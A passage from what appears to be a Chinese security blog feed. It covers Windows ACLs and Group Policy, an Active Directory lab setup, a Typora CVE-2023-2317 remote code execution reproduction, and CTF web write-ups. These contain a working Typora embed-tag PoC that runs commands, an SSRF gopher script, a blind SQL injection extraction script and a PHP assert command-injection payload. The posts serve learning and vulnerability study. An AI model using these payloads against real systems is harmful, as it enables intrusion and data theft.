C:\Users\Alice\Desktop\Test /grant Hacker:(OI)(CI)(F) /t</span><br></pre></td></tr></table></figure><p>OI 代表对象集成 CI代表容器集成 F 代表完全访问</p><p>执行以下命令删除Hacker对指定文件或目录的完全访问权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icaclas C:\Users\Alice\Desktop\Test /remove Hacker /t</span><br></pre></td></tr></table></figure><h2 id="6-组策略"><a href="#6-组策略" class="headerlink" title="6.组策略"></a>6.组策略</h2><p>组策略是Windows环境下管理账户的一种手段,可以控制用户账户和计算机账户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311814326.png"><br>1.本地组策略是组策略基本版本，适用于管理独立且非域环境的计算机<br>2.域环境中的组策略适用于管理域环境的所有对象，包括所有用户和计算机，可对域环境中的所有用户和计算机等对象进行多维管理，如安全配置、应用程序安装配置、开关机等</p><h4 id="6-1组策略对象"><a href="#6-1组策略对象" class="headerlink" title="6.1组策略对象"></a>6.1组策略对象</h4><p>组策略对象(GPR)是组策略设置的集合。<br>在设置组策略时，只要将组策略对象链接道指定站点、域和组织单位，其中的策略值便会应用到该站点、域和组织单位的所有用户和计算机。</p><p>组策略对象由组策略容器(GPC)和组策略模板(GPT)两个组件组成在Windows中分别存储在与孔的不同位置。<br>GPC存储与活动目录的域分区<br>GPT存放在与控制器的%SYSTEMROOT%\SYSVOL\sysvol\域名\Policies文件夹中</p><p>可以通过组策略管理来查看和编辑每个GPO的设置<br>可以看到两个默认组策略对象Default Domain Policy 和 Default Domain Controller Policy,他们在域控被创建时自动建立<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311821955.png"></p><p>(1)Default Domain Policy 默认组策略对象<br>Default Domain Policy 应用到其所在域的所有用户和计算机<br>右键该组策略可以保存报告,保存类型可以为HTML或XML.<br>右键选择编辑可以打开组策略编辑器<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311824303.png"></p><p>组策略编辑器可以分别对该组策略链接到的作用于的用户和计算机进行配置,分为策略和首选项两种不同强制程度。策略配置是强制性的配置，作用域中的客户端应用这些配置后就无法自行更改。首选项相当于默认值的作用是非强制的，客户端可以自行更改其中的配置值。</p><p>(2)Default Domain Controllers Policy 默认组策略对象<br>Default Domain Controllers Policy 应用道Domain Controllers 中所有的用户和计算机</p><h5 id="组策略容器"><a href="#组策略容器" class="headerlink" title="组策略容器"></a>组策略容器</h5><p>组策略容器存储在活动目录的与分区中，路径为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CN=Policies, CN=System, DC=hack-my, DC=com</span><br></pre></td></tr></table></figure><p>GPC中记录着该组策略对象的策略名称、标识组策略的GUID、组策略链接到的作用域、组策略模板的路径、组策略的版本信息等各种元数据。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311834919.png"><br>displayName为组策略名称, 该组策略名为Default Domain Policy<br>gPCFileSysPath属性为组策略模板存放的路径,该组策略模板存放路径为\\hack-my.com\sysvol\hack-my.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}</p><p>当域中某对象应用某组策略时,该对象的gPLink属性值将指向这条组策略的完整DN<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311838884.png"><br>图中DC&#x3D;hack-my, DC&#x3D;com 应用了Default Domain Policy 组策略,所以该组织单位的gPLink属性值指向了Default Domain Policy 组策略的完整DN</p><h5 id="组策略模板"><a href="#组策略模板" class="headerlink" title="组策略模板"></a>组策略模板</h5><p>GPT存储该组策略实际的配置数据，被存放在域控制器的共享目录。%SYSTEMROOT%\SYSVOL\sysvol\域名\Policies下以GUID命名的文件夹中</p><p>以GUID标识的各组策略配置目录中包含以下内容<br>MACHINE: 该文件包含一些针对该组策略的整个作用域中计算机的具体配置。<br>USER: 该文件包含一些针对该组策略的整个作用域中用户的信息。<br>GPT.INI: 该文件包含一些关于该组策略的策略名称、版本信息等配置信息。</p><h4 id="6-2-组策略的创建"><a href="#6-2-组策略的创建" class="headerlink" title="6.2 组策略的创建"></a>6.2 组策略的创建</h4><p>创建一个新的组策略,并将其应用一个预先创建的组织单位”科研中心”.</p><p>右键 组策略对象<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311840165.png"></p><p>随便取名为Test Domain Policy<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311842040.png"></p><p>右键hack-my.com 创建组织单位命名为科研部门<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311843472.png"></p><p>右键科研部门,选择链接现有GPO,选择Test Domain Policy<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311844507.png"></p><p>此时Test Domain Policy已经被链接到了科研部门。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311848550.png"><br>接着可以编辑这条组策略，例如将这条组策略中的用户密码长度最小长度为7<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311849168.png"></p><h2 id="7-内网环境搭建"><a href="#7-内网环境搭建" class="headerlink" title="7.内网环境搭建"></a>7.内网环境搭建</h2><p>windows镜像下载地址: <a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p><h3 id="单域环境搭建"><a href="#单域环境搭建" class="headerlink" title="单域环境搭建"></a>单域环境搭建</h3><p>网络环境拓补<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271255081.png"></p><h4 id="1-Windows-Server-2012-DC"><a href="#1-Windows-Server-2012-DC" class="headerlink" title="1.Windows Server 2012 -DC"></a>1.Windows Server 2012 -DC</h4><p>1.网络配置</p><p>IP: 192.168.89.10<br>子网掩码: 255.255.255.0<br>默认网关: 192.168.89.1<br>DNS指向本机IP: 192.168.89.10<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291633039.png"></p><p>2.主机属性设置<br>主机名: DC<br>域: hack-my.com<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271305344.png"></p><p>服务器管理器-&gt;添加角色和功能<br>默认下一步,直到出现选择服务器角色的步骤,在角色中勾选DNS服务器和Active Directory域服务<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271311038.png"></p><p>勾选如果需要,自动重启服务器<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271435823.png"></p><p>这里我选择安装后把虚拟机重启了<br>需要指定升级为域控<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291420382.png"><br>写入域名hack-my.com<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291422934.png"></p><p>设定DSRM(目录服务还原模式,允许管理员在域环境出故障时还原目录数据库)密码<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291424520.png"></p><p>之后保持默认下一步<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291429215.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291430888.png"></p><p>发现需要重置Administrator的密码<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291433261.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291435266.png"><br>再次检查先决条件,安装即可<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291436956.png"></p><p>安装成功后,重新启动服务器,切换至Administrator登录<br>发现AD DS 和 DNS 安装成功<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291549738.png"></p><p>把DNS改回 192.168.89.10</p><p>为了能让后续加入域中的Windows Server 2008 和 Windows 7 用户可以正常登录,为他们创建域用户<br>打开服务器管理器-&gt;工具-&gt;Active Directory 用户和计算机, 选中Users目录并单击右键<br>新建用户Alice,并设置其密码永不过期<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291559165.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291601871.png"></p><p>Alice - ==xy159753<br>成功创建用户Alice<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291604100.png"></p><h4 id="2-Windows-Server-2008-Web"><a href="#2-Windows-Server-2008-Web" class="headerlink" title="2.Windows Server 2008 - Web"></a>2.Windows Server 2008 - Web</h4><p>先改网络设置<br>ip: 192.168.89.20<br>子网掩码: 255.255.255.0<br>默认网关:192.168.89.1<br>DNS: 192.168.89.10<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291631784.png"></p><p>将该主机添加值域中<br>控制面板-&gt;系统-&gt;改变设置<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291638603.png"></p><p>登录域用户<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291640421.png"></p><p>成功加入域<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291641456.png"></p><h4 id="3-Windows-7"><a href="#3-Windows-7" class="headerlink" title="3.Windows 7"></a>3.Windows 7</h4><p>参照Windows Server 2008 加入域环境<br>IP: 192.168.89.30<br>子网掩码: 255.255.255.0<br>网关: 192.168.89.1</p><p>DNS: 192.168.89.10<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302044079.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302045994.png"></p><p>登录后,成功加入hack-my.com域<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302047083.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora 远程代码执行漏洞复现</title>
      <link href="/2023/08/29/Typora%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/08/29/Typora%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Typora-远程代码执行-CVE-2023-2317"><a href="#Typora-远程代码执行-CVE-2023-2317" class="headerlink" title="Typora 远程代码执行-CVE-2023-2317"></a>Typora 远程代码执行-CVE-2023-2317</h1><h2 id="1-产品简介"><a href="#1-产品简介" class="headerlink" title="1.产品简介"></a>1.产品简介</h2><p>Typora是一款功能强大且易于使用的笔记软件，它旨在为用户提供简洁、无干扰的写作和阅读体验。<br>Typora支持多种常用的标记语言，如Markdown、AsciiDoc等。Markdown是一种轻量级标记语言，被广泛用于写作、编写文档和博客等场景。Typora内置了对Markdown的完整支持，使得你可以使用Markdown语法快速创建标题、列表、链接、表格等各种格式，并能够实时预览最终的渲染效果。</p><h2 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a>2.漏洞概述</h2><p>1.6.7版本以前的Typora中的updater&#x2F;update.html中存在DOM型XSS,该漏洞允许通过加载特制md文件从而执行js代码。攻击者可以通过构造恶意md文件，其中包含引用update.html的&lt;embed&gt;标签,使用特权接口reqnode访问节点模块child_process从而执行任意系统命令。</p><h2 id="3-影响范围"><a href="#3-影响范围" class="headerlink" title="3.影响范围"></a>3.影响范围</h2><p>Typora版本 &lt; 1.6.7</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4.复现过程"></a>4.复现过程</h2><p>复现环境:<br>Typora 版本 1.3.8</p><p>reqnode特权接口调用访问child_process执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br></pre></td></tr></table></figure><p>base64加密<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291348942.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==</span><br></pre></td></tr></table></figure><p>构造POC</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建md文件<br>将POC粘贴其中<br>成功执行命令<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291350630.png"></p><h2 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a>5.修复方案</h2><p>更新Typora版本至1.6.7及以上</p><h2 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h2><p><a href="https://mp.weixin.qq.com/s/hMMqhVxx8YBokNrSM-__fQ">https://mp.weixin.qq.com/s/hMMqhVxx8YBokNrSM-__fQ -信安404</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界练习-CTF入门(二)</title>
      <link href="/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8(%E4%BA%8C)/"/>
      <url>/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="1-难度三"><a href="#1-难度三" class="headerlink" title="1.难度三"></a>1.难度三</h1><h2 id="1-very-easy-sql-NO-GFSJ1008"><a href="#1-very-easy-sql-NO-GFSJ1008" class="headerlink" title="1.very_easy_sql-NO.GFSJ1008"></a>1.very_easy_sql-NO.GFSJ1008</h2><p>访问页面后有输入框，尝试万能登陆但是登陆失败<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171005998.png"></p><p>查看页面源码，发现注释中存在use.php，访问后是一个curl探测输入框<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171005580.png"><br>猜测需要配合SSRF，尝试file协议，发现被过滤，返回页面为nonono<br>尝试<br>SSRF Gopher协议使用<br>构造gopher:&#x2F;&#x2F;协议数据流<br>先尝试读取index<br>看了大佬的wp,尝试自己写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python  </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> urllib.parse  </span><br><span class="line">  </span><br><span class="line">target = <span class="string">&quot;127.0.0.1:80/&quot;</span>  </span><br><span class="line">content = <span class="string">&quot;uname=admin&amp;passwd=admin&quot;</span>  </span><br><span class="line">content_len = <span class="built_in">len</span>(content)  </span><br><span class="line">  </span><br><span class="line">req = \  </span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /index.php HTTP/1.1  </span></span><br><span class="line"><span class="string">HOST: 127.0.0.1  </span></span><br><span class="line"><span class="string">User-Agent: curl/7.43.0  </span></span><br><span class="line"><span class="string">Accept: */*  </span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded  </span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&#123;&#125;  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_len,content)  </span><br><span class="line">  </span><br><span class="line">first = urllib.parse.quote(req)  </span><br><span class="line">tmp = first.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)  </span><br><span class="line">last = urllib.parse.quote(tmp)  </span><br><span class="line">res = <span class="string">&quot;gopher://&quot;</span>+target+<span class="string">&quot;_&quot;</span>+last  </span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>请求结果:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171537142.png"><br>发现出现了base64的set-sookie<br>解密后为 admin<br>得知设置cookie为admin, 但是返回页面来看并不存在admin用户<br>推测后台对admin进行了判断，可能存在注入</p><p>cookie所在处可被注入<br>官方WP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:64317/use.php?url=&quot;</span> </span><br><span class="line">flag = <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="comment">#从pos位截取</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="comment">#爆破每一位结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(1=1,sleep(5),1) # &quot; </span></span><br><span class="line">        <span class="comment"># security 爆库名</span></span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(ascii( substr((database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; </span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># flag 爆表名</span></span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; </span></span><br><span class="line"><span class="comment">#1-50位都截取，进行ascii比对，延时注入爆破flag</span></span><br><span class="line">        poc = <span class="string">&quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot;</span> + <span class="built_in">str</span>(pos) + <span class="string">&quot;,1) )=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,sleep(2),1) # &quot;</span> </span><br><span class="line">        bs = <span class="built_in">str</span>(base64.b64encode(poc.encode(<span class="string">&quot;utf-8&quot;</span>)), <span class="string">&quot;utf-8&quot;</span>) </span><br><span class="line">        <span class="comment">#POC构造同上，加上cookie参数，cookie位注入点</span></span><br><span class="line">        final_poc = <span class="string">&quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;</span> + bs + <span class="string">&quot;%3B%250d%250a&quot;</span> </span><br><span class="line">        t1 = time.time() </span><br><span class="line">        res = requests.get(url + final_poc)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="comment">#延时判断</span></span><br><span class="line">        <span class="keyword">if</span> (t2 - t1 &gt; <span class="number">2</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(flag) </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>爆破出flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171624034.png"></p><h2 id="2-mfm-NO-GFSJ0415"><a href="#2-mfm-NO-GFSJ0415" class="headerlink" title="2.mfm-NO.GFSJ0415"></a>2.mfm-NO.GFSJ0415</h2><p>登录进场景后发现以page为访问索引<br>尝试万能取出，返回为空<br>在访问about时发现使用了git<br>猜测存在git泄露</p><p>成功访问.git<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171006731.png"></p><p>使用GitHack获取git源码<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171006250.png"></p><p>下载后的源码里的flag.php为空，index.php调用templates文件夹里的四个文件<br>对index.php进行代码审计</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- 传参处理 --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#GET传入参数page</span></span><br><span class="line"><span class="comment">#没有的话默认查看home</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">##定义$file</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="comment">#查找..第一次出现的位置</span></span><br><span class="line"><span class="comment">#or 如果第一个是对的，总值为真，不会执行第二个</span></span><br><span class="line"><span class="comment">#第一条语句 即$file里没有..</span></span><br><span class="line"><span class="comment">#由于是通过assert传入字符串进行命令执行，我们可以截断字符串从而执行其他命令</span></span><br><span class="line"><span class="comment">#$file=1&#x27;,&#x27;&#x27;) or system(&#x27;cat templates/flag.php&#x27;);//</span></span><br><span class="line"><span class="comment">#assert(&quot;strpos(&#x27;       1&#x27;,&#x27;&#x27;) or system(&#x27;cat templates/flag.php&#x27;);//                         &#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="comment">#对$file存在性进行判断，如果存在就往下执行，不存在输出die中内容</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终构造page</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,&#x27;&#x27;) or system(&#x27;cat templates/flag.php&#x27;);//</span><br></pre></td></tr></table></figure><p>查看页面源码得到flag</p><p>注意:在截断assert时无法将assert闭合再将后面的字符串注释</p><h2 id="3-lottery-NO-GFSJ0099"><a href="#3-lottery-NO-GFSJ0099" class="headerlink" title="3.lottery-NO.GFSJ0099"></a>3.lottery-NO.GFSJ0099</h2><p>点击下载附件获取网页源码<br>访问网站,发现注册后每次买彩票花费2刀,中了才会返回钱<br>花费$9990000 可以买flag</p><p>查看源码<br>随机生成结果</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_win_nums</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="title function_ invoke__">random_num</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>购买函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">    <span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">    <span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">    <span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();</span><br><span class="line">    <span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="comment">#遍历我们猜的每一位和结果比对，如果等于则same_count加1</span></span><br><span class="line">    <span class="comment">#对比方法用的是==而不是=== 可能存在漏洞</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$same_count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">    <span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在php中真值和任一数字比较的值均为真，<br>所以抓包，将numbers改成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;numbers&quot;:[true,true,true,true,true,true,true]</span><br></pre></td></tr></table></figure><p>比对后，拿到money<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181350628.png"><br>多买几次就可以购买flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181357728.png"></p><h2 id="4-simple-js-NO-GFSJ0480"><a href="#4-simple-js-NO-GFSJ0480" class="headerlink" title="4.simple_js-NO.GFSJ0480"></a>4.simple_js-NO.GFSJ0480</h2><p>访问页面，随便输了个密码登陆后查看源码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span 